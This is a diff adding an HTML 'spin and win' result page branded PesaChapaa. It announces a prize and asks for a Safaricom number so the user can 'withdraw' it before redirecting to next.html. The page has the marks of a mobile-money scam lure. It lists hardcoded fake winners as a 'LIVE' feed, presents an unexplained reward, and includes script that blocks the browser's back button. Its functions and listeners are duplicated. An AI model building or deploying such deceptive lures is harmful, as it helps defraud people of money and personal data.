@@ -1,0 +1,1165 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>ChapaaMoto — Your Result</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Manrope:wght@700;800&display=swap" rel="stylesheet">
+
+<style>
+
+:root{
+    --black:#050708;
+    --navy:#081218;
+    --navy2:#0d1b22;
+
+    --gold:#d8a84e;
+    --gold-light:#f3d28a;
+    --gold-bright:#ffd979;
+
+    --green:#00b887;
+    --green-light:#52d8b5;
+
+    --white:#ffffff;
+    --muted:#89969a;
+
+    --border:rgba(255,255,255,.09);
+}
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    min-height:100vh;
+    padding:20px 14px 45px;
+
+    font-family:"DM Sans",sans-serif;
+
+    color:var(--white);
+
+    background:
+        radial-gradient(
+            circle at 50% -10%,
+            rgba(216,168,78,.20),
+            transparent 35%
+        ),
+        radial-gradient(
+            circle at 0% 45%,
+            rgba(0,184,135,.09),
+            transparent 30%
+        ),
+        var(--black);
+}
+
+body::before{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+
+    background:
+        linear-gradient(
+            120deg,
+            transparent,
+            rgba(255,255,255,.018),
+            transparent
+        );
+}
+
+.container{
+    width:100%;
+    max-width:460px;
+    margin:auto;
+}
+
+/* =========================
+   TOP BRAND
+========================= */
+
+.topbar{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+
+    margin-bottom:22px;
+}
+
+.brand{
+    color:var(--gold-light);
+
+    font-family:"Manrope",sans-serif;
+    font-size:18px;
+    font-weight:800;
+
+    letter-spacing:2px;
+}
+
+/* =========================
+   RESULT CARD
+========================= */
+
+.result-card{
+    position:relative;
+
+    overflow:hidden;
+
+    padding:30px 20px 24px;
+
+    border:1px solid rgba(216,168,78,.22);
+    border-radius:28px;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,.075),
+            rgba(255,255,255,.025)
+        );
+
+    box-shadow:
+        inset 0 1px 0 rgba(255,255,255,.08),
+        0 30px 80px rgba(0,0,0,.45);
+}
+
+.result-card::before{
+    content:"";
+
+    position:absolute;
+
+    width:220px;
+    height:220px;
+
+    left:50%;
+    top:-90px;
+
+    transform:translateX(-50%);
+
+    border-radius:50%;
+
+    background:rgba(216,168,78,.13);
+
+    filter:blur(55px);
+}
+
+/* =========================
+   WINNER BADGE
+========================= */
+
+.winner-badge{
+    position:relative;
+
+    display:inline-flex;
+    align-items:center;
+    gap:7px;
+
+    padding:7px 12px;
+
+    border:1px solid rgba(0,184,135,.22);
+    border-radius:999px;
+
+    background:rgba(0,184,135,.08);
+
+    color:var(--green-light);
+
+    font-size:9px;
+    font-weight:800;
+
+    letter-spacing:1.5px;
+}
+
+.winner-dot{
+    width:6px;
+    height:6px;
+
+    border-radius:50%;
+
+    background:var(--green);
+
+    box-shadow:
+        0 0 10px var(--green);
+}
+
+/* =========================
+   TITLE
+========================= */
+
+h1{
+    position:relative;
+
+    margin-top:20px;
+
+    font-family:"Manrope",sans-serif;
+
+    font-size:clamp(31px,9vw,43px);
+
+    line-height:1.05;
+
+    font-weight:800;
+
+    letter-spacing:-1.5px;
+}
+
+.subtitle{
+    position:relative;
+
+    margin-top:10px;
+
+    color:var(--muted);
+
+    font-size:13px;
+
+    line-height:1.6;
+}
+
+/* =========================
+   REWARD DISPLAY
+========================= */
+
+.reward-box{
+    position:relative;
+
+    margin:25px 0 23px;
+
+    padding:22px 15px;
+
+    border-radius:22px;
+
+    border:1px solid rgba(216,168,78,.28);
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(216,168,78,.12),
+            rgba(255,255,255,.025)
+        );
+
+    box-shadow:
+        inset 0 1px 0 rgba(255,255,255,.06);
+}
+
+.reward-label{
+    color:#879397;
+
+    font-size:9px;
+    font-weight:800;
+
+    letter-spacing:3px;
+}
+
+.reward{
+    margin-top:4px;
+
+    font-family:"Manrope",sans-serif;
+
+    font-size:clamp(48px,14vw,70px);
+
+    line-height:1;
+
+    font-weight:800;
+
+    letter-spacing:-4px;
+
+    color:var(--gold-bright);
+
+    text-shadow:
+        0 5px 25px rgba(216,168,78,.22);
+}
+
+.reward-caption{
+    margin-top:11px;
+
+    color:#788589;
+
+    font-size:9px;
+}
+
+/* =========================
+   FORM
+========================= */
+
+.form-title{
+    margin-bottom:8px;
+
+    color:#dce5e4;
+
+    font-size:13px;
+    font-weight:700;
+}
+
+.form-description{
+    margin-bottom:13px;
+
+    color:#778487;
+
+    font-size:10px;
+    line-height:1.5;
+}
+
+.phone-wrap{
+    position:relative;
+}
+
+.phone-input{
+    width:100%;
+
+    padding:17px 16px;
+
+    border:1px solid rgba(255,255,255,.10);
+
+    border-radius:15px;
+
+    outline:none;
+
+    background:rgba(0,0,0,.28);
+
+    color:white;
+
+    font-family:"DM Sans",sans-serif;
+
+    font-size:15px;
+
+    transition:
+        border-color .2s ease,
+        box-shadow .2s ease;
+}
+
+.phone-input::placeholder{
+    color:#667477;
+}
+
+.phone-input:focus{
+    border-color:rgba(216,168,78,.55);
+
+    box-shadow:
+        0 0 0 3px rgba(216,168,78,.08);
+}
+
+/* =========================
+   CTA
+========================= */
+
+.withdraw-btn{
+    width:100%;
+
+    min-height:60px;
+
+    margin-top:12px;
+
+    border:1px solid rgba(255,255,255,.22);
+
+    border-radius:16px;
+
+    background:
+        linear-gradient(
+            135deg,
+            #f0ca72,
+            #c9973e
+        );
+
+    color:#081014;
+
+    font-family:"Manrope",sans-serif;
+
+    font-size:13px;
+
+    font-weight:800;
+
+    letter-spacing:.8px;
+
+    cursor:pointer;
+
+    box-shadow:
+        0 15px 40px rgba(216,168,78,.18);
+
+    transition:
+        transform .2s ease,
+        box-shadow .2s ease;
+}
+
+.withdraw-btn:hover{
+    transform:translateY(-2px);
+
+    box-shadow:
+        0 20px 50px rgba(216,168,78,.27);
+}
+
+.withdraw-btn:active{
+    transform:translateY(0);
+}
+
+/* =========================
+   SECURITY NOTE
+========================= */
+
+.security-note{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:6px;
+
+    margin-top:11px;
+
+    color:#5f6b6e;
+
+    font-size:8px;
+}
+
+.security-icon{
+    color:var(--green-light);
+}
+
+/* =========================
+   LIVE RECENT ACTIVITIES
+========================================= */
+
+.recent-activities {
+    width: min(100%, 520px);
+    margin: 25px auto;
+
+    padding: 18px;
+
+    border-radius: 22px;
+
+    background:
+        linear-gradient(
+            145deg,
+            rgba(255,255,255,0.07),
+            rgba(255,255,255,0.025)
+        );
+
+    border: 1px solid rgba(255, 210, 90, 0.18);
+
+    box-shadow:
+        0 20px 60px rgba(0,0,0,0.35),
+        inset 0 1px rgba(255,255,255,0.08);
+
+    overflow: hidden;
+}
+
+
+/* HEADER */
+
+.activities-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+
+    margin-bottom: 14px;
+
+    color: #f4d477;
+
+    font-size: 11px;
+
+    font-weight: 900;
+
+    letter-spacing: 1.8px;
+}
+
+
+/* LIVE DOT */
+
+.live-dot {
+    width: 7px;
+    height: 7px;
+
+    border-radius: 50%;
+
+    background: #35e68a;
+
+    box-shadow:
+        0 0 8px rgba(53,230,138,0.9);
+
+    animation: livePulse 1.3s infinite;
+}
+
+
+@keyframes livePulse {
+
+    0%,
+    100% {
+        opacity: 1;
+        transform: scale(1);
+    }
+
+    50% {
+        opacity: 0.35;
+        transform: scale(0.65);
+    }
+
+}
+
+
+/* LIVE LABEL */
+
+.live-label {
+    margin-left: auto;
+
+    padding: 4px 8px;
+
+    border-radius: 20px;
+
+    background: rgba(53,230,138,0.10);
+
+    border: 1px solid rgba(53,230,138,0.25);
+
+    color: #52ed9b;
+
+    font-size: 8px;
+
+    letter-spacing: 1px;
+}
+
+
+/* VIEWPORT */
+
+.activity-window {
+    position: relative;
+
+    height: 245px;
+
+    overflow: hidden;
+}
+
+
+/* FADE AT TOP */
+
+.activity-window::before {
+    content: "";
+
+    position: absolute;
+
+    top: 0;
+    left: 0;
+
+    width: 100%;
+    height: 35px;
+
+    background:
+        linear-gradient(
+            to bottom,
+            rgba(17,22,22,1),
+            transparent
+        );
+
+    z-index: 5;
+
+    pointer-events: none;
+}
+
+
+/* FADE AT BOTTOM */
+
+.activity-window::after {
+    content: "";
+
+    position: absolute;
+
+    bottom: 0;
+    left: 0;
+
+    width: 100%;
+    height: 35px;
+
+    background:
+        linear-gradient(
+            to top,
+            rgba(17,22,22,1),
+            transparent
+        );
+
+    z-index: 5;
+
+    pointer-events: none;
+}
+
+
+/* LIST */
+
+.activity-list {
+    display: flex;
+
+    flex-direction: column;
+
+    gap: 9px;
+
+    animation:
+        activityScroll 16s linear infinite;
+}
+
+
+@keyframes activityScroll {
+
+    0% {
+        transform: translateY(0);
+    }
+
+    100% {
+        transform: translateY(-50%);
+    }
+
+}
+
+
+/* ACTIVITY ITEM */
+
+.activity {
+    display: flex;
+
+    align-items: center;
+
+    gap: 10px;
+
+    min-height: 58px;
+
+    padding: 10px 12px;
+
+    border-radius: 15px;
+
+    background:
+        rgba(255,255,255,0.035);
+
+    border:
+        1px solid rgba(255,255,255,0.045);
+}
+
+
+/* CHECK ICON */
+
+.activity-icon {
+    display: flex;
+
+    align-items: center;
+    justify-content: center;
+
+    width: 30px;
+    height: 30px;
+
+    flex-shrink: 0;
+
+    border-radius: 50%;
+
+    background:
+        rgba(53,230,138,0.10);
+
+    border:
+        1px solid rgba(53,230,138,0.25);
+
+    color: #4de996;
+
+    font-size: 13px;
+
+    font-weight: 900;
+}
+
+
+/* TEXT */
+
+.activity div {
+    flex: 1;
+
+    min-width: 0;
+}
+
+
+.activity strong {
+    display: block;
+
+    color: #ffffff;
+
+    font-size: 12px;
+
+    font-weight: 800;
+}
+
+
+.activity span {
+    display: block;
+
+    margin-top: 2px;
+
+    color: #aeb8b6;
+
+    font-size: 10px;
+}
+
+
+.activity small {
+    flex-shrink: 0;
+
+    color: #788380;
+
+    font-size: 9px;
+}
+
+/* =========================================================
+   FOOTER
+========================================================= */
+
+footer {
+    padding-top:
+        32px;
+
+    text-align:
+        center;
+}
+
+
+.footer-logo {
+    color:
+        var(--gold-light);
+
+    font-family:
+        "Manrope",
+        sans-serif;
+
+    font-size:
+        13px;
+
+    font-weight:
+        800;
+
+    letter-spacing:
+        0.5px;
+}
+
+
+footer p {
+    margin-top:
+        6px;
+
+    color:
+        #465255;
+
+    font-size:
+        8px;
+}
+
+/* =========================
+   MOBILE
+========================= */
+
+@media(max-width:480px){
+
+    body{
+        padding:15px 11px 35px;
+    }
+
+    .result-card{
+        padding:27px 17px 21px;
+        border-radius:24px;
+    }
+
+    .reward{
+        font-size:57px;
+    }
+
+    .activity{
+        padding:15px;
+    }
+
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="topbar">
+        <div class="brand">
+            PESACHAPAA
+        </div>
+    </div>
+
+
+    <div class="result-card">
+
+        <div class="winner-badge">
+            <span class="winner-dot"></span>
+            SPIN COMPLETED
+        </div>
+
+
+        <h1>
+            Congratulations!
+        </h1>
+
+        <p class="subtitle">
+            Your spin has been completed successfully.
+            Your displayed reward is shown below.
+        </p>
+
+
+        <div class="reward-box">
+
+            <div class="reward-label">
+                YOUR REWARD
+            </div>
+
+            <div class="reward" id="winningAmount">
+    Loading...
+</div>
+
+            <div class="reward-caption">
+                Reward generated by your completed spin
+            </div>
+
+        </div>
+
+
+        <div class="form-title">
+            Continue to the next step
+        </div>
+
+        <div class="form-description">
+            Enter your Safaricom number to continue.
+        </div>
+
+
+        <div class="phone-wrap">
+
+            <input
+                id="phone"
+                class="phone-input"
+                type="tel"
+                inputmode="numeric"
+                autocomplete="tel"
+                maxlength="10"
+                placeholder="07XXXXXXXX"
+            >
+
+        </div>
+
+
+        <button
+            class="withdraw-btn"
+            onclick="requestWithdrawal()"
+        >
+            CONTINUE
+            <span> →</span>
+        </button>
+
+
+        <div class="security-note">
+            <span class="security-icon">●</span>
+            Secure form • Your number is used for the next step
+        </div>
+
+    </div>
+
+
+   <div class="recent-activities">
+
+    <div class="activities-header">
+        <span class="live-dot"></span>
+        RECENT ACTIVITIES
+        <span class="live-label">LIVE</span>
+    </div>
+
+    <div class="activity-window">
+
+        <div class="activity-list" id="activityList">
+
+            <div class="activity">
+                <span class="activity-icon">✓</span>
+                <div>
+                    <strong>Sarah M.</strong>
+                    <span>won KSh 5,000</span>
+                </div>
+                <small>just now</small>
+            </div>
+
+            <div class="activity">
+                <span class="activity-icon">✓</span>
+                <div>
+                    <strong>Brian K.</strong>
+                    <span>completed the promotion</span>
+                </div>
+                <small>12 sec ago</small>
+            </div>
+
+            <div class="activity">
+                <span class="activity-icon">✓</span>
+                <div>
+                    <strong>Mary W.</strong>
+                    <span>won KSh 10,000</span>
+                </div>
+                <small>24 sec ago</small>
+            </div>
+
+            <div class="activity">
+                <span class="activity-icon">✓</span>
+                <div>
+                    <strong>Kevin O.</strong>
+                    <span>completed the promotion</span>
+                </div>
+                <small>38 sec ago</small>
+            </div>
+
+            <div class="activity">
+                <span class="activity-icon">✓</span>
+                <div>
+                    <strong>Jane N.</strong>
+                    <span>won KSh 2,500</span>
+                </div>
+                <small>51 sec ago</small>
+            </div>
+
+            <div class="activity">
+                <span class="activity-icon">✓</span>
+                <div>
+                    <strong>David A.</strong>
+                    <span>completed the promotion</span>
+                </div>
+                <small>1 min ago</small>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+    <footer>
+
+        <div class="footer-logo">
+            PesaChapaa
+        </div>
+
+        <p>
+            © 2026 PesaChapaa. All rights reserved.
+        </p>
+
+    </footer>
+
+</div>
+
+
+<script>
+
+/* =========================
+   LOAD WINNING RESULT
+========================= */
+
+(function loadWinningResult() {
+
+    console.log("RESULT PAGE LOADED");
+
+    const reward =
+        document.getElementById("winningAmount");
+
+    if (!reward) {
+
+        console.error(
+            "ERROR: #winningAmount does not exist."
+        );
+
+        return;
+    }
+
+
+    /* READ LOCAL STORAGE */
+
+    const savedPrize =
+        localStorage.getItem("winningAmount");
+
+
+    console.log(
+        "================================"
+    );
+
+    console.log(
+        "LOCALSTORAGE WINNING AMOUNT:",
+        savedPrize
+    );
+
+    console.log(
+        "================================"
+    );
+
+
+    /* DISPLAY RESULT */
+
+    if (savedPrize) {
+
+        reward.textContent = savedPrize;
+
+    } else {
+
+        reward.textContent =
+            "No winning result found";
+
+        console.warn(
+            "winningAmount is missing from localStorage."
+        );
+    }
+
+})();
+
+
+/* =========================
+   PHONE VALIDATION
+========================= */
+
+function requestWithdrawal() {
+
+    const phone =
+        document.getElementById("phone").value.trim();
+
+
+    if (phone === "") {
+
+        alert(
+            "Please enter your Safaricom number."
+        );
+
+        return;
+    }
+
+
+    if (!/^07\d{8}$/.test(phone)) {
+
+        alert(
+            "Please enter a valid 10-digit number beginning with 07."
+        );
+
+        return;
+    }
+
+
+    window.location.replace("next.html");
+}
+
+
+/* =========================
+   ENTER KEY
+========================= */
+
+document
+    .getElementById("phone")
+    .addEventListener("keydown", function(event) {
+
+        if (event.key === "Enter") {
+
+            requestWithdrawal();
+
+        }
+
+    });
+
+
+/* =========================
+   PREVENT BACK
+========================= */
+
+history.pushState(
+    null,
+    "",
+    location.href
+);
+
+window.addEventListener(
+    "popstate",
+    function() {
+
+        history.pushState(
+            null,
+            "",
+            location.href
+        );
+
+    }
+);
+
+
+
+    /* =========================
+       ENTER KEY
+    ========================= */
+
+    document
+        .getElementById("phone")
+        .addEventListener("keydown", function(event) {
+
+            if (event.key === "Enter") {
+                requestWithdrawal();
+            }
+
+        });
+
+
+
+/* =========================
+   PHONE VALIDATION
+========================= */
+
+function requestWithdrawal() {
+
+    const phone =
+        document
+            .getElementById("phone")
+            .value
+            .trim();
+
+
+    if (phone === "") {
+
+        alert(
+            "Please enter your Safaricom number."
+        );
+
+        return;
+    }
+
+
+    if (!/^07\d{8}$/.test(phone)) {
+
+        alert(
+            "Please enter a valid 10-digit number beginning with 07."
+        );
+
+        return;
+    }
+
+
+    window.location.replace("next.html");
+}
+
+
+/* =========================
+   PREVENT BACK TO WHEEL
+========================= */
+
+history.pushState(
+    null,
+    "",
+    location.href
+);
+
+window.addEventListener(
+    "popstate",
+    function () {
+
+        history.pushState(
+            null,
+            "",
+            location.href
+        );
+
+    }
+);
+
+</script>
+
+</body>
+</html>
